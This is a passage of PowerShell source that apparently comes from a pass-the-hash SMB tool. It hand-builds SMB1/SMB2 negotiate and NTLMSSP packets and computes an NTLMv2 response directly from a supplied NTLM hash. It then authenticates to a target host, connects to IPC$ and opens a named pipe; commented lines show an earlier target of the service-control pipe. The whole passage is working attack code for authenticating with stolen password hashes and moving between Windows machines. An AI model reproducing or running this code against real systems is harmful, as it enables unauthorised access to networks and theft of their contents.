                    'NegotiateSMB'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {    
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version = 'SMB1'
                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        Write-Verbose "[+] SMB signing is required"
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }

                                }

                            }
                            else
                            {
                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {

                                        if($signing_check)
                                        {
                                            Write-Verbose "[+] SMB signing is required"
                                        }

                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }

                                }

                            }

                        }
                        catch
                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')
                            {
                                Write-Output "[-] SMB1 negotiation failed"
                                $negoitiation_failed = $true
                                $stage = 'Exit'
                            }

                        }

                    }

                    'NegotiateSMB2'
                    {

                        if($SMB_version -eq 'SMB2.1')
                        {
                            $message_ID = 0
                        }
                        else
                        {
                            $message_ID = 1
                        }

                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {

                                if($signing_check)
                                {
                                    Write-Verbose "[+] SMB signing is required"
                                }

                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is not required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }

                    'NTLMSSPNegotiate'
                    {

                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $negoitiation_failed = $true
            }

        }

        if(!$signing_check -and !$negoitiation_failed)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }

        }

  

    if($login_successful)
    {


        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')
        {
            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00
        }
        else
        {
            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
        }



        if($SMB_version -eq 'SMB1')
        {
            $stage = 'TreeConnect'

            while ($stage -ne 'Exit')
            {
            
                switch ($stage)
                {

                    'CloseRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'TreeDisconnect'
                    }


                    'CreateAndXRequest'
                    {
                        [System.Text.Encoding]::UTF8.GetBytes($PipeName) | ForEach-Object{$SMB_named_pipe_tobyte += "{0:X2}-00-" -f $_}
                        $SMB_named_pipe_tobyte = $SMB_named_pipe_tobyte.Substring(0,$SMB_named_pipe_tobyte.Length-1)
                        $SMB_named_pipe_bytes = $SMB_named_pipe_tobyte.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                        #$SMB_named_pipe_bytes = 0x74,0x00,0x65,0x00,0x73,0x00,0x74,0x00,0x70,0x00,0x69,0x00,0x70,0x00,0x65,0x00,0x73,0x00 # testpipes
                        # old code $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl
                        $SMB_tree_ID = $client_receive[28,29]
                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        Write-Verbose "CreateAndXRequest send"
                        $stage = 'TreeDisconnect'
                    }
                  

                    'Logoff'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x74 0x18 0x07,0xc8 0x34,0xfe $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBLogoffAndXRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }


                    'ReadAndXRequest'
                    {
                        Start-Sleep -m $Sleep
                        $packet_SMB_header = New-PacketSMBHeader 0x2e 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBReadAndXRequest $SMB_FID
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = $stage_next
                    }
                
                
                    'TreeConnectAndXRequest'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x75 0x18 0x01,0x48 0xff,0xff $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = 2 
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeConnectAndXRequest $SMB_path_bytes
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'CreateAndXRequest'
                    }

                    'TreeDisconnect'
                    {
                        $packet_SMB_header = New-PacketSMBHeader 0x71 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)
                        {
                            $packet_SMB_header["Flags2"] = 0x05,0x48
                            $SMB_signing_counter = $SMB_signing_counter + 2
                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                            $packet_SMB_header["Signature"] = $SMB_signing_sequence
                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
                        $packet_SMB_data = New-PacketSMBTreeDisconnectRequest
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
                            $SMB_signature = $MD5.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..7]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Logoff'
                    }

                }
            
            }

        }  
        else
        {
            
            $stage = 'TreeConnect'

            try
            {

                while ($stage -ne 'Exit')
                {

                    switch ($stage)
                    {
                

                        'CloseRequest'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
        
                            $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }

                    
                        'CreateRequest'
                        {
                            $stage_current = $stage
                            [System.Text.Encoding]::UTF8.GetBytes($PipeName) | ForEach-Object{$SMB_named_pipe_tobyte += "{0:X2}-00-" -f $_}
                            $SMB_named_pipe_tobyte = $SMB_named_pipe_tobyte.Substring(0,$SMB_named_pipe_tobyte.Length-1)
                            $SMB_named_pipe_bytes = $SMB_named_pipe_tobyte.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                            
                            #$SMB_named_pipe_bytes = $SMB_named_pipe_tobyte #0x74,0x00,0x65,0x00,0x73,0x00,0x74,0x00,0x70,0x00,0x69,0x00,0x70,0x00,0x65,0x00,0x73,0x00 # testpipes
                            # old code $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2CreateRequestFile $SMB_named_pipe_bytes
                            $packet_SMB2_data["Share_Access"] = 0x07,0x00,0x00,0x00  
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data  
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                                Write-Verbose "CreateRequest send!"
                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                    Write-Verbose "pending"
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }

                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }                    

                        }


                        'Logoff'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
